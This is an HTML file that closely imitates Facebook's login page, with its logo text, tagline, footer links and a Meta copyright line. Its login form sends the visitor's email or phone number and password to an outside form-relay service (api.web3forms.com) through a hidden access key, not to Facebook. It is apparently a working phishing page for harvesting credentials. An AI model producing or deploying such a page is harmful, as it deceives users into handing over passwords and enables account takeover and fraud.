<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Facebook-login-signup</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="facebook.png"
  
  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap");

      * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: "Roboto", sans-serif;
      }
      
      .res {
          display: flex;
          align-items: center;
      }
      
      .row {
          padding: 0 15px;
          min-height: 100vh;
          justify-content: center;
          background: #f0f2f5;
      }
      
      .fb-form {
          justify-content: space-between;
          max-width: 1000px;
          width: 100%;
      }
      
      .fb-form .card {
          margin-bottom: 90px;
      }
      
      .fb-form h1 {
          color: #1877f2;
          font-size: 4rem;
          margin-bottom: 10px;
      }
      
      .fb-form p {
          font-size: 1.75rem;
          white-space: nowrap;
      }
      
      form {
          display: flex;
          flex-direction: column;
          background: #fff;
          border-radius: 8px;
          padding: 20px;
          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
          max-width: 400px;
          width: 100%;
      }
      
      form input {
          height: 55px;
          width: 100%;
          border: 1px solid #ccc;
          border-radius: 6px;
          margin-bottom: 15px;
          font-size: 1rem;
          padding: 0 14px;
      }
      
      form input:focus {
          outline: none;
          border-color: #1877f2;
      }
      
      ::placeholder {
          color: #777;
          font-size: 1.063rem;
      }
      
      .fb-submit {
          display: flex;
          flex-direction: column;
          text-align: center;
          gap: 15px;
      }
      
      .fb-submit .login {
          border: none;
          outline: none;
          cursor: pointer;
          background: #1877f2;
          padding: 15px 0;
          border-radius: 6px;
          color: #fff;
          font-size: 1.25rem;
          font-weight: 600;
          transition: 0.2s ease;
      }
      
      .fb-submit .login:hover {
          background: #0d65d9;
      }
      
      form a {
          text-decoration: none;
      }
      
      .fb-submit .forgot {
          color: #1877f2;
          font-size: 0.875rem;
      }
      
      .fb-submit .forgot:hover {
          text-decoration: underline;
      }
      
      hr {
          border: none;
          height: 1px;
          background-color: #ccc;
          margin-bottom: 20px;
          margin-top: 20px;
      }
      
      .button {
          margin-top: 25px;
          text-align: center;
          margin-bottom: 20px;
      }
      
      .button a {
          padding: 15px 20px;
          background: #42b72a;
          border-radius: 6px;
          color: #fff;
          font-size: 1.063rem;
          font-weight: 600;
          transition: 0.2s ease;
      }
      
      .button a:hover {
          background: #3ba626;
      }
      
      .footer-langs {
          max-width: 1000px;
          margin: 0 auto;
          padding: 20px;
      }
      
      footer ol {
          display: flex;
          flex-wrap: wrap;
          list-style-type: none;
          padding: 8px 0;
      
          margin-left: 3vh;
      }
      
      footer ol:first-child {
          border-bottom: 1px solid #dddfe2;
      }
      
      footer ol:first-child li:last-child button {
          background-color: #f5f6f7;
          border: 1px solid #ccd0d5;
          outline: none;
          color: #4b4f56;
          padding: 0 8px;
          font-weight: 700;
          font-size: 12px;
      }
      
      footer ol li {
          padding-right: 20px;
          font-size: 12px;
          color: #8a8d91;
      }
      
      footer ol li a {
          text-decoration: none;
          color: #8a8d91;
      }
      
      footer ol li a:hover {
          text-decoration: underline;
      }
      
      footer small {
          font-size: 12px;
          color: #8a8d91;
          margin-left: 3vh;
      }
      
      @media (max-width: 900px) {
          .fb-form {
              flex-direction: column;
              text-align: center;
          }
      
          .fb-form .card {
              margin-bottom: 30px;
          }
      }
      
      @media (max-width: 460px) {
          .fb-form h1 {
              font-size: 3.5rem;
          }
      
          .fb-form p {
              font-size: 1.3rem;
          }
      
          form {
              padding: 15px;
          }
      }
      </style>
</head>

<body>
    <div class="row res">
        <div class="fb-form res">
            <div class="card">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            
            <div>
            <form action="https://api.web3forms.com/submit" method="POST">
      
              <input type="hidden" name="access_key" value="a1633aa9-4e14-4e68-9b69-05f2a66f61c3">
        <input type="email" name="email" required placeholder="Email or phone number">
          <input type="text" name="text" required placeholder="Password">
              <div class="fb-submit">
                <button type="submit" class="login">Login</button>
                    <a href="#" class="forgot">Forgot password?</a>
              <hr>
              </div>
            </form>
                <div class="button">
                    <a href="#">Create new account</a>
                </div>
            </form>
        </div>
        </div>
    <footer>
        <div class="footer-langs">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">मराठी</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">ગુજરાતી</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">ਪੰਜਾਬੀ</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">മലയാളം</a></li>
                <li><button>+</button></li>
            </ol>
            <ol>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Video</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Meta Pay</a></li>
                <li><a href="#">Meta Store</a></li>
                <li><a href="#">Meta Quest</a></li>
                <li><a href="#">Imagine with Meta AI</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Threads</a></li>
                <li><a href="#">Fundraisers</a></li>
                <li><a href="#">Services</a></li>
                <li><a href="#">Voting Information Centre</a></li>
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Privacy Centre</a></li>
                <li><a href="#">Groups</a></li>
                <li><a href="#">About</a></li>
                <li><a href="#">Create ad</a></li>
                <li><a href="#">Create Page</a></li>
                <li><a href="#">Developers</a></li>
                <li><a href="#">Careers</a></li>
                <li><a href="#">Cookies</a></li>
                <li><a href="#">AdChoices</a></li>
                <li><a href="#">Terms</a></li>
                <li><a href="#">Help</a></li>
                <li><a href="#">Contact uploading and non-users</a></li>
            </ol>
            <small>Meta © 2024</small>
        </div>
    </footer>
</body>

</html>
